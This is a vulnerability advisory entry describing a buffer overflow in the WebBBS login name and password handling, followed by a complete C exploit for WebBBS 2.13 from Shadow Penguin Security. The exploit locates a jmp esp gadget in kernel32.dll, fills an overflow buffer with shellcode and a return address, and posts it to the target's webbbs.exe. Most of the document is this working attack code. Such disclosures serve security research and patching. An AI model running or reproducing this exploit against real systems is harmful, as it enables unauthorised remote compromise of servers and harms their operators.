source: http://www.securityfocus.com/bid/803/info

Certain versions of WebBBS by Mike Bryeans of International TeleCommunications contain a flaw in the initial login program. User supplied data via the login name and password are not bounds checked and can result in a buffer overflow. This leads a compromise of the system running WebBBS. 

/*=============================================================================
   WebBBS Ver2.13 Exploit
   The Shadow Penguin Security (http://shadowpenguin.backsection.net)
   Written by UNYUN (shadowpenguin@backsection.net)
  =============================================================================
*/

#include    <stdio.h>
#include    <string.h>
#include    <windows.h> 
#include    <winsock.h>

#define     HEAD1 \
"POST /scripts/webbbs.exe HTTP/1.1\r\n"\
"Accept: application/msword, application/vnd.ms-excel, image/gif, "\
"image/x-xbitmap, image/jpeg, image/pjpeg, */*\r\n"\
"Accept-Language: ja\r\n"\
"Content-Type: application/x-www-form-urlencoded\r\n"\
"Accept-Encoding: gzip, deflate\r\n"\
"User-Agent: Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; DigExt)\r\n"\
"Host: 192.168.0.100\r\n"\
"Content-Length: 106\r\n"\
"Connection: Keep-Alive\r\n\r\n"\
"uid=&upw="

#define     HEAD2 "&JOB=TOP&\r\nsub=+%83%8D%83O%83C%83%93+\r\n"


#define     HTTP_PORT       80
#define     MAXBUF          80
#define     RETADR          48
#define     JMPESP_1        0xff
#define     JMPESP_2        0xe4
#define     NOP             0x90
#define     KERNEL_NAME     "kernel32.dll"      


unsigned char jmp_code[100]={
0x8B,0xDC,0x33,0xC0,0xB0,0x23,0xC1,0xE0,
0x10,0x66,0xB8,0x97,0xD9,0x2B,0xD8,0xFF,
0xE3,0x00
};

unsigned char exp_code[100]={
0x33,0xC0,0x50,0x50,0xB0,0x12,0x50,0x66,
0xB8,0xFF,0xFF,0x50,0xB8,0xb8,0x58,0xf5,
0xbf,0xff,0xd0,0x50,0x50,0xB8,0x2c,0x23,
0xf5,0xbf,0xff,0xd0,0x00
};

main(int argc,char *argv[])
{
    SOCKET               sock;
    SOCKADDR_IN          addr;
    WSADATA              wsa;
    WORD                 wVersionRequested;
    unsigned int         i,kp,ip;
    static unsigned char buf[MAXBUF],buf2[1000],buf3[1000],*q;
    struct hostent       *hs;
    MEMORY_BASIC_INFORMATION meminfo;

    if (argc<2){
        printf("usage: %s VictimHost\n",argv[0]);
        exit(1);
    }
    if ((void *)(kp=(unsigned int)LoadLibrary(KERNEL_NAME))==NULL){
        printf("Can not find %s\n",KERNEL_NAME);
        exit(1);
    }

    VirtualQuery((void *)kp,&meminfo,sizeof(MEMORY_BASIC_INFORMATION)); 
    ip=0;
    for (i=0;i<meminfo.RegionSize;i++){
        ip=kp+i;
        if ( ( ip     &0xff)==0
          || ((ip>>8 )&0xff)==0
          || ((ip>>16)&0xff)==0
          || ((ip>>24)&0xff)==0) continue;
        q=(unsigned char *)ip;
        if (*q==JMPESP_1 && *(q+1)==JMPESP_2) break;
    }
    printf("RETADR  : %x\n",ip);
    if (ip==0){
        printf("Can not find codes which are used by exploit.\n");
        exit(1);
    }

    wVersionRequested = MAKEWORD( 2, 0 );
    if (WSAStartup(wVersionRequested , &wsa)!=0){
        printf("Winsock Initialization failed.\n"); return -1;
    }
    if ((sock=socket(AF_INET,SOCK_STREAM,0))==INVALID_SOCKET){
        printf("Can not create socket.\n"); return -1;
    }
    addr.sin_family     = AF_INET;
    addr.sin_port       = htons((u_short)HTTP_PORT);
    if ((addr.sin_addr.s_addr=inet_addr(argv[1]))==-1){
            if ((hs=gethostbyname(argv[1]))==NULL){
                printf("Can not resolve specified host.\n"); return -1;
            }
            addr.sin_family = hs->h_addrtype;
            memcpy((void *)&addr.sin_addr.s_addr,hs->h_addr,hs->h_length);
    }
    if (connect(sock,(LPSOCKADDR)&addr,sizeof(addr))==SOCKET_ERROR){
        printf("Can not connect to specified host.\n"); return -1;
    }
    memset(buf,NOP,MAXBUF); buf[MAXBUF]=0;
    strncpy(buf,exp_code,strlen(exp_code));

    buf[RETADR  ]=ip&0xff;
    buf[RETADR+1]=(ip>>8)&0xff;
    buf[RETADR+2]=(ip>>16)&0xff;
    buf[RETADR+3]=(ip>>24)&0xff;

    strncpy(buf+RETADR+4,jmp_code,strlen(jmp_code));
    
    send(sock,HEAD1,strlen(HEAD1),0);
    send(sock,buf,strlen(buf),0);
    send(sock,HEAD2,strlen(HEAD2),0);
    closesocket(sock);
    printf("Done.\n");
    return FALSE;
}